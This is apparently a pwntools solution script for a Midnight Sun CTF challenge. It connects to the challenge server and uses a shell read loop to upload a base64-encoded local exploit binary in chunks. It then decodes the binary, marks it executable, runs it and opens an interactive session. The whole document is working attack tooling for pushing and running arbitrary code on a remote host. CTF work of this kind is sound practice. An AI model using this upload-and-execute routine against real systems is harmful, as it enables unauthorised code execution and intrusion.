from pwn import *

r = remote("hfsipc-01.play.midnightsunctf.se", 8192);
r.sendlineafter(b"$", b'echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > tmp')

payload = b64e(read("./fs/exploit"))
r.recvuntil(b"start\r\n");
sleep(0.5)
to_send = payload.encode()
while to_send:
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]
r.send(b"\nend\n")

r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"./exploit")
r.interactive()